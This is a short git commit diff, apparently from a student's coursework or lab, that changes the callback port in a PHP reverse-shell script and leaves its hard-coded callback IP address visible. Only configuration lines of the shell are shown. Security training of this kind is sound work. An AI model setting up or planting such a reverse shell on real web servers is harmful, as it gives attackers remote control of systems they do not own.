a804fc59913027d7b79a809366daa4c6a6577567
michael student <m.guarrera@student.uq.edu.au>
2024-05-03 16:44:59 +1000

    hi

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -47,7 +47,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '10.176.132.84';  // CHANGE THIS
-$port = 6969;       // CHANGE THIS
+$port = 4200;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
